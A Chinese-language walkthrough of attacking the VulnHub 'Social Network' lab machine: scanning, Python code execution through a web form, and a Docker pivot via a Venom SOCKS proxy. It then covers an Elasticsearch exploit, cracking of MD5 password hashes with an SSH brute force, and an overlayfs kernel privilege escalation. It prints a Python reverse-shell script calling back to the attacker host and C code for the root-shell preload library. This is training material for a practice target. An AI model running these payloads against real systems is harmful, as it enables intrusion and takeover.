> 靶机环境介绍

+ [Social Network 靶机下载地址](https://www.vulnhub.com/entry/boredhackerblog-social-network,454/)
+ **难度等级:** <font color=orange>中等</font>

## 主机发现与信息收集

已知攻击机(10.0.2.15) 与靶机 (10.0.2.5) 在同一个网段

这时我们可以使用一下命令来进行主机的发现
```bash
sudo arp-scan -l
```

![20220427_2219.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e0a0c8da17a2036a5cf54ca912877dd0.png)

发现目标主机的ip地址为 10.0.2.5

这时候就可以对其端口进行扫描

```bash
nmap -p- 10.0.2.5
# -p- 代表全端口
```

![20220427_2221.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/76af3d165b83f7bc1432d8773e18db19.png)


扫描之后可以发现该主机开放了 22，5000 端口
但 5000 端口我们其实并不知道其服务类型和功能

这时我们可以使用nmap 来对其端口的版本信息和服务信息进行一个扫描

```bash
nmap -p22,5000 -sV 10.0.2.5
```


![20220424_2125.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4416c53c4e2b90d65936c39a7392af30.png)


扫描之后发现 5000 端口为一个使用python 的http服务,这时我们就可以通过浏览器对该服务进行一个初步的观察和测试

![20220424_2126.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/afe9650fcf7b14597032eb8b48ba5ac3.png)

经过一系列的观察和测试发现该页面好像并没有什么明显的漏洞或者信息，只是有一个表单，并且当我们输入一些信息上去之后会回显在页面上

![20220424_2126_1.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/bc03d51d230c91d72f274b162864721f.png)


## Web目录扫描

这时候我们就可以换个思路，因为它是一个web服务，那我们是不是可以去扫描一下该web服务端口下是否还有别的网页。

<font color=red>这边使用dirsearch对目标进行扫描</font>


![20220427_2235.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/a9b544eebd3b0104091d936526d7cf80.png)


## 远程代码执行
发现确实有一个网页存在在 5000 端口下
访问一下该网页，发现该网页有几个很敏感的点

1. 上面说叫我们输入代码进行执行
2. 确实有个输入框，可以输入内容。
3. 且还有一个测试代码的按钮

> 结合该端口是一个python服务,我们可以尝试一下这边是否可以执行python代码

![20220424_2127.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/633c3fef2a3007fb4f0344a18b54f660.png)

测试之后发现确实能在此处远程执行python代码
这时我们只需要去网上查找一下关于 python 反弹shell 的相关代码并修改一下端口和目标ip等相关参数即可。


> 记得在运行代码之前,先在攻击机上监听对应的端口 (8888)

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 8888))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])
```

![20220424_2145.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4a710360d6b9860e3bb9f0c0fe9baba5.png)

发现我们成功获得了一个shell,当我们使用 id 命令发现我们以及是 root 用户了,但想想就发现不对劲了,这台靶机的难度等级为中级，想想也知道不太可能这么容易就获得 root 权限,当我们查看当前目录时，发现有一个 Dockerfile文件。
这时就怀疑是否我们获得的权限（shell）只是目标靶机内的一个 Docker 虚拟机



![20220424_2317.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/fad366601b511a04ae82bdc9a5c52bac.png)
当我们发现根目录下有 `.dockerenv` 这个文件,有百分之九十的概率,该主机为 Docker 虚拟机

```bash
cat /proc/1/cgroup

```

我们知道 `/proc/1` 进程id 为 1 的进程基本都是跟系统的初始化相关的操作

而跟系统初始化相关的操作 `cgroup`文件夹里包含了很多跟 Docker 镜像主机指示信息

<font color=red>那么我们就能断定该主机为 Docker 虚拟机</font>

## 内网渗透

我们查看该 Docker 容器的 IP 地址 发现与刚刚发现的主机的 IP 地址完全不同，

<font color=red>这时候我们相当于又进入了一个内网环境</font>

![20220424_2319.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/84c6878ba9ea3cdea096fa874c67e96a.png)


这时我们就可以以这台主机的内网环境,去进一步发现该内网内是否还有其它主机,其它主机是否存在漏洞,等一系列信息搜集操作,从而进一步攻击更多的主机。

我们可以使用原始的方式(该主机已有工具)去进行内网的信息收集
如:
```bash
ping -c 1 172.17.0.4  

for i in $(seq 1 255); do ping -c 1 172.17.0.$i; done; 

```

![20220424_2336.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/0688bc71d1ff271debb6975508a56ebd.png)

但我们发现该网段为 16 ,理论上存在 65535 个主机,所以使用这种方式效率极低

这时我们就会想,是否能将 kali 中的工具调到该内网环境中来使用呢?

这时我们就要使用一种叫做<font color="red" face=Monaco size=3>内网穿透</font> 的技术

> 也就是将我们的建立攻击机与内网环境的网络路由

[Venom Download Link](https://github.com/Dliv3/Venom/releases)


先在攻击机上运行对应服务端( `admin_linux` )程序并监听对应的Venom端口 (9999)
![20220425_0000.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f496b1d86a80a491db918a1aa6da9018.png)

在将Venom 的客户端程序通过 python 内置的http服务传输到目标靶内的 Docker 虚拟机内

![20220425_0004.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/2d411afedf51f8269f179b1c6083b3bb.png)

赋予权限运行后发现成功建立连接
![20220425_0007.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/c5cb5958d235692d5b60ab63770dcf2c.png)


这样一来,我们可以使用 Venom 来开启 Socks 代理

相关命令:

```bash
show # 查看所有已经建立的连接
goto 1 # 跳转到一号节点
socks 1080 # 开启 socks 代理在 1080端口上

```
![20220425_0009.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/06f309f27defa3073b571ac0f9381acb.png)

这样的话,我们就在 kali 主机上开启了一个在 1080 端口侦听的 socks 代理
为了让 kali 主机上所有的扫描工具,攻击工具 都可以挂代理去访问内网的整个网段的话
我们还需要使用 `proxychains` 这款工具.

修改 `proxychains4.conf`这个配置文件

在一些版本的kali系统中,该文件的路径可能并不相同如 2020.4 版本中的kali系统 该文件路径在
`/etc/proxychains4.conf`


```bash
vim /etc/proxy/proxychains4.conf
```


![20220425_0020.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/8630cab2aca74df4496eaccc6c291c21.png)

![20220425_0024.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/046af673054221f2c01ab1603e12e277.png)

发现该内网网段中 `172.17.0.1` 中开放的端口和一开始那台主机完全一样 

再对该主机端口的服务版本信息进行扫描
```bash
proxychains nmap -p22,5000 -Pn -sT -sV 172.17.0.1
```
发现该主机与目标靶机(10.0.2.5) 开放端口和服务完全一致

我们还可以在网页内访问 `172.17.0.1` 所开放的网站服务来进一步确认我们的猜想,但因为该主机在目标靶机中的内网环境,要想通过攻击机的浏览器访问该主机还是需要使用 socks 代理

**具体操作过程:**

![20220425_0031.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/aec92440a38eb5ee4aedba8f798b4e66.png)

访问 `172.17.0.1` 所开放的网站服务,发现我们在主机发现过程中输入的 zhouhaobusy 在这边还有显示,网页内容完全一样

![20220425_0034.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7643fa97585a18baa47d908812b339e2.png)

通过以上内容分析,可以知道 `172.17.0.1` 所开放的服务就是 `10.0.2.5` 对外开放的服务

但我们刚刚在内网主机发现时还发现了有 `172.17.0.3` 这台主机也在线

故我们接下来应该再对 `172.17.0.3` 这台内网主机进行扫描与分析,具体操作过程还是和刚刚的操作一样

1. 先对其进行端口扫描

![20220425_0038.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/ef5cb6ece853a042ff7198d16bc62e7a.png)
2. 对端口的版本服务进行扫描

![20220425_0039.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/edc7450cc7fc76cdbda2f59663e10c00.png)

经过上面的扫描发现其主机开放的端口和之前的主机不一样,这时候我们就需要提高警惕性了

发现其服务为 Elasticsearch 而 Elasticsearch 在历史上存在过很多的高危漏洞(甚至有好几个远程代码执行漏洞)

开放了 9200 端口 而这个端口默认就是 Elasticsearch 开放的端口,通过上面对其服务版本的探测更证实了我们的猜测与推理 开放的端口,通过上面对其服务版本的探测更证实了我们的猜测与推理.
通过搜索引擎,<font color=red>我们发现 Elasticsearch 在历史上存在过很多高危漏洞甚至有远程代码执行这种级别的漏洞。</font>





这时我们就有理由怀疑这个 Elasticsearch 是否存在相关的漏洞?

我们就可以去尝试一下,看看该服务是否存在相关漏洞

而在 kali 中有很多已知漏洞的利用代码
```bash
# 根据keyword查询与其相关存在的漏洞
searchsploit keyword 
```

![20220425_0053.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/65180fd1abe63d42e086df0d6f481ea3.png)

这时我们就可以先去查询一下关于该服务的漏洞有哪些，并尝试一下这些利用代码是否能够生效
我们将该利用代码复制出来

<font color="red" face=Monaco size=3> 默认路径在 `/usr/share/exploitdb/explots/ + path` </font>
![20220425_0058.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/3e88d1a4bbeb85fe794d759bae57ee99.png)

简单查看一下该利用代码

![20220425_0058_1.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/dd4d8bd58d1eb4241a71635f282ecbfd.png)

该漏洞利用需要至少一条数据，否则无法利用成功
插入一条数据
```bash
proxychains4 curl -X POST 'http://172.17.0.2:9200/doc/test' -d '{"name" : "testttt"}'
```

![20220425_0134.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/5fd50c3e20d33b132b1f4bc0f6ab867b.png)
插入一条数据成功后我们运行该漏洞利用代码

![20220425_0133.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/6455b3f9c1d316fd93213bd637a1e413.png)
发现该漏洞利用代码被成功执行了,并成功获得了172.17.0.3 主机的 root 权限


## 密码爆破
查看当前目录的文件，我们发现了一个敏感文件 `passwords`

![20220425_0136.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/8f5b13e81d2bce00b90476eba09e4032.png)

查看该文件，发现该文件由类似用户名和一串MD5
值,我们将这些类似MD5值的数据，逐个上传到解密MD5的网站上进行解密,解出以下对应关系

```txt
john:3f8184a7343664553fcb5337a3138814 （1337hack）
test:861f194e9d6118f3d942a72be3e51749（1234test）
admin:670c3bbc209a18dde5446e5e6c1f1d5b（1111pass）
root:b3d34352fc26117979deabdf1b9b6354（1234pass）
jane:5c158b60ed97c723b673529b8a3cf72b（1234jane）
```

分别将用户名和密码分别保存在不同的文件里，来创建密码字典文件 (`用户名 -> user.txt 密码 -> passwd.txt`),并使用 `hydra` 来尝试进行暴力破解


![20220425_0146.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/b0353f30f5cb821f50cc1f4b53120293.png)

发现成功解出一个用户名和其对应的密码
我们使用该用户名和密码使用ssh对该主机进行远程登入,而这一次登入的主机就是我们要攻击的靶机，而不是虚拟机

![20220425_0147.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e7b2dc4fe91c1add911312e5dc4f9da8.png)

## 内核漏洞提权

我们使用 id 命令查看该用户的权限，发现它仅仅只是一个普通用户,这时候我们就要提权

我们先使用 uname 来查看一下关于操作系统的信息, <font color="red" face=Monaco size=3> 发现其操作系统内核版本只有 3.13 </font> 
这时候就要考虑，能不能使用操作系统内核来进行提权

```bash
# 查看操作系统相关的信息
uname -a 
```
![20220425_0148.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4de34bb53863111d4dd950f8f97a55e7.png)

所以我们还是使用以下命令来查询相关漏洞利用代码

```bash
searchsploit Linux 3.13
```

![20220428_0112.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/19ba98d3f9616af1ec48b0b13a061c34.png)



我们成功找到一条相关的利用代码,所以我们尝试使用该代码进行提权

![20220425_0157.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/d00d380951760d9da75cbddd6b1bb147.png)

在攻击机内进行编译，并将其二进制文件传到目标机中,运行发现提权失败,而报错信息提示我们没有相关的库文件.
![20220425_0203.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/d258f2ea250c5e420ca23b4bbecdf755.png)

打开并查看一下该漏洞利用代码,发现该程序需要加载一个动态连接库文件
<font color="red" face=Monaco size=3>基本思路是:能不能将该程序要加载,链接的库文件传到目标机上,然后在运行</font>

![20220428_0122.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/52aa9c43e71f4437e03cee7699f095a0.png)


**获取动态链接库的两种方式**
1. 使用 `locate` 命令来查找是否存在该动态链接库 ( 在kali 里内置了许多关于漏洞利用所需要的动态链接库,所以一般的动态链接库我们都能通过该方式获取到)

![20220425_0205.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/25ddb019fd22842e1a77b33d15804087.png)

2. 分析源码来自己编译链接获取
```c++

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"
int main(){
    int lib;
    lib = open("./ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o ./ofs-lib.so ./ofs-lib.c -ldl -w");
    exit(0);
}
```
将上面的代码在攻击机中保存到一个文件中，编译后运行，即可得到我们所要的库文件。
![20220428_0155.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/a69f1af517692778bee9a4737c356cac.png)

<font color="red" face=Monaco size=3>通过该程序我们发现该程序调用了 gcc 进行编译,而目标靶机中并没有 gcc 而这就是为什么我们第一次运行漏洞利用代码失败的原因
</font>

![20220428_0153.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/c92a4aaa0cbff5db13726e83f4d62ddd.png)


然后将编译动态链接库相关的代码删除后重新编译，并将已经生成好的 `ofs-lib.so` 文件一并传到靶机中的tmp目录下，再次运行发现成功获得该靶机的root权限。

![20220425_0223.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/d920ec8652e459aaaf07733130a46af5.png)

<font color=green size=4>至此该靶机就已经渗透完成啦!!!</font>

